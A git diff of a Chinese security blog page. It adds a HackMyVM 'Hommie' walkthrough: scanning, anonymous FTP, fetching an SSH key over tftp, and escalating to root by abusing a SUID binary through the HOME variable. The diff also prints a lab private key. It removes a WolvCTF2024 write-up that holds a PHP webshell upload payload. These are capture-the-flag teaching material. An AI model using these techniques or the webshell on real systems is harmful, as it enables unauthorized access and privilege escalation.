@@ -185,6 +185,119 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/23/HackmyVM-Hommie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/23/HackmyVM-Hommie/" class="post-title-link" itemprop="url">HackmyVM-Hommie</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-01-23 19:28:47 / 修改时间：19:39:53" itemprop="dateCreated datePublished" datetime="2025-01-23T19:28:47+08:00">2025-01-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class="line">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class="line">192.168.31.116  08:00:27:26:b1:6f       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br></pre></td></tr></table></figure>
+
+<p>ip为192.168.31.116，nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.116 --min-rate=1000 -p-</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:29 EST</span><br><span class="line">Nmap scan report for hommie (192.168.31.116)</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds</span><br></pre></td></tr></table></figure>
+
+<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# curl 192.168.31.116</span><br><span class="line">alexia, Your id_rsa is exposed, please move it!!!!!</span><br><span class="line">Im fighting regarding reverse shells!</span><br><span class="line">-nobody</span><br></pre></td></tr></table></figure>
+
+<p>80端口目录也扫描不到，只给了一个提示，alexia的id_rsa泄露了，去看21端口</p>
+<h1 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ftp anonymous@192.168.31.116</span><br><span class="line">Connected to 192.168.31.116.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||35772|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0               0 Sep 30  2020 index.html</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||35347|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    3 0        113          4096 Sep 30  2020 .</span><br><span class="line">drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..</span><br><span class="line">drwxrwxr-x    2 0        113          4096 Jan 23 06:12 .web</span><br><span class="line">-rw-r--r--    1 0        0               0 Sep 30  2020 index.html</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd .web</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||27864|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 106      113            35 Jan 23 06:12 1.phtml</span><br><span class="line">-rw-r--r--    1 0        0              99 Sep 30  2020 index.html</span><br><span class="line">-rw-r--r--    1 106      113          5493 Jan 23 06:09 rev.php</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure>
+
+<p>21端口有匿名登录，存在.web目录，可以往80端口传文件，但是不解析php，只能放弃</p>
+<h1 id="tftp"><a href="#tftp" class="headerlink" title="tftp"></a>tftp</h1><p>扫描udp端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.116 --min-rate=1000 -sU --top-ports 20</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:34 EST</span><br><span class="line">Nmap scan report for hommie (192.168.31.116)</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">53/udp    closed        domain</span><br><span class="line">67/udp    open|filtered dhcps</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">69/udp    open|filtered tftp</span><br><span class="line">123/udp   open|filtered ntp</span><br><span class="line">135/udp   closed        msrpc</span><br><span class="line">137/udp   open|filtered netbios-ns</span><br><span class="line">138/udp   open|filtered netbios-dgm</span><br><span class="line">139/udp   open|filtered netbios-ssn</span><br><span class="line">161/udp   closed        snmp</span><br><span class="line">162/udp   open|filtered snmptrap</span><br><span class="line">445/udp   open|filtered microsoft-ds</span><br><span class="line">500/udp   open|filtered isakmp</span><br><span class="line">514/udp   closed        syslog</span><br><span class="line">520/udp   open|filtered route</span><br><span class="line">631/udp   open|filtered ipp</span><br><span class="line">1434/udp  open|filtered ms-sql-m</span><br><span class="line">1900/udp  open|filtered upnp</span><br><span class="line">4500/udp  open|filtered nat-t-ike</span><br><span class="line">49152/udp open|filtered unknown</span><br><span class="line">MAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds</span><br></pre></td></tr></table></figure>
+
+<p>tftp的服务开着，结合80端口给的提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# tftp 192.168.31.116</span><br><span class="line">tftp&gt; get id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>可以下载下来alexia的id_rsa</p>
+<p>ssh登录</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>找有suid的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">alexia@MiWiFi-RA71-srv:~$ find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">/opt/showMetheKey</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br></pre></td></tr></table></figure>
+
+<p><code>/opt/showMetheKey</code>很可疑啊,运行一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">alexia@MiWiFi-RA71-srv:~$ /opt/showMetheKey</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7</span><br><span class="line">V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y</span><br><span class="line">Rn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT</span><br><span class="line">gCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j</span><br><span class="line">QMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq</span><br><span class="line">kyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI</span><br><span class="line">M2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM</span><br><span class="line">dgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW</span><br><span class="line">rH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B</span><br><span class="line">tIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T</span><br><span class="line">d/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/</span><br><span class="line">+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE</span><br><span class="line">Ua47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w</span><br><span class="line">pmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk</span><br><span class="line">WeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz</span><br><span class="line">bu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu</span><br><span class="line">3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6</span><br><span class="line">0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z</span><br><span class="line">HlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs</span><br><span class="line">y6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY</span><br><span class="line">OZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08</span><br><span class="line">QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp</span><br><span class="line">ivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN</span><br><span class="line">0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>把alexia的id_rsa输出了，将这个二进制文件拖下来放进ida看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setuid(0);</span><br><span class="line">  setgid(0);</span><br><span class="line">  system(&quot;cat $HOME/.ssh/id_rsa&quot;);</span><br><span class="line">  return 0;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>他是查看环境变量里HOME变量下的.ssh/id_rsa,可以修改HOME变量读取root的id_rsa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alexia@MiWiFi-RA71-srv:~$ export HOME=/root</span><br><span class="line">alexia@MiWiFi-RA71-srv:/home/alexia$ env</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PWD=/home/alexia</span><br><span class="line">LOGNAME=alexia</span><br><span class="line">XDG_SESSION_TYPE=tty</span><br><span class="line">HOME=/root</span><br></pre></td></tr></table></figure>
+
+<p>再次运行拿到root的id_rsa，登录即可</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/22/HackmyVM-Connection/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1209,111 +1322,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/18/WolvCTF2024-%E5%A4%8D%E7%9B%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lvzhouhang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/03/18/WolvCTF2024-%E5%A4%8D%E7%9B%98/" class="post-title-link" itemprop="url">WolvCTF2024-复盘</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-03-18 17:40:20 / 修改时间：19:56:03" itemprop="dateCreated datePublished" datetime="2024-03-18T17:40:20+08:00">2024-03-18</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">复盘</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>6.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Bean-Cafe"><a href="#Bean-Cafe" class="headerlink" title="Bean Cafe"></a>Bean Cafe</h2><p>他的验证逻辑是通过图片的md5的值来验证的，所以我们只需要传两张MD5相同的图片就可以获得flag</p>
-<p><a target="_blank" rel="noopener" href="https://drive.google.com/drive/folders/1eCcMtQkHTreAJT6JmwxG10x1HbT6prY0">https://drive.google.com/drive/folders/1eCcMtQkHTreAJT6JmwxG10x1HbT6prY0</a></p>
-<h2 id="Upload-Fun"><a href="#Upload-Fun" class="headerlink" title="Upload Fun"></a>Upload Fun</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;f&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file too large&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">str_contains</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;f&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;..&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no .. in filename please&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;f&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;empty file&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line">        <span class="variable">$hash</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$flag</span> . <span class="variable">$ip</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;f&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;./uploads/&quot;</span> . <span class="variable">$hash</span> . <span class="string">&quot;_&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;f&quot;</span>][<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload success&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;f&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;./uploads/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&quot;f&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">str_contains</span>(<span class="variable">$path</span>, <span class="string">&quot;..&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;no .. in f please&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">include</span> <span class="variable">$path</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>首先分析一下源码，源码通过POST方式来上传文件并且上传的文件不能包含<code>..</code>用GET的方式来读取文件也不能带有<code>..</code>，上传的文件在<code>uploads</code>目录下，但是我们不知道<code>$hash</code>是什么。</p>
-<p>通过谷歌得知在linux种文件名的长度最大可为255个字符，我们可以通过这种方式让它报错来得知他的值</p>
-<p><img src="/./pic/WolvCTF2024/upload.png"></p>
-<p>我们可以看到他的回显告诉我们了hash的值，然后我们再上传一句话木马访问即可。</p>
-<p>POST上传文件的请求体模板:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: </span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;122&quot;, &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;122&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https://0ad900b10331bc6f843fbff300b80018.web-security-academy.net</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylZktl8pLMuKyOfBy</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Content-Length: 198</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarylZktl8pLMuKyOfBy</span><br><span class="line">Content-Disposition: form-data; name=&quot;&quot;; filename=&quot;&quot;</span><br><span class="line">Content-Type: </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&#x27;1&#x27;])?&gt;</span><br><span class="line">------WebKitFormBoundarylZktl8pLMuKyOfBy</span><br></pre></td></tr></table></figure>
-
-<h2 id="Username"><a href="#Username" class="headerlink" title="Username"></a>Username</h2><p>题目提示了jwt可以爆破，那这道题肯定和jwt伪造有关。</p>
-<p>用jwt-cracker爆破密钥，为<code>mstzt</code></p>
-<p>因为有<data>标签，所以判断为xxe注入，但是正常的xxe他会有过滤，不能引用东西。可以使用<code>XInclude attack</code>关于<a target="_blank" rel="noopener" href="https://d0pt3x.gitbook.io/passion/webapp-security/xxe-attacks/xinclude-attacks">XInclude attack</a></data></p>
-<p>读取/app/app.py文件</p>
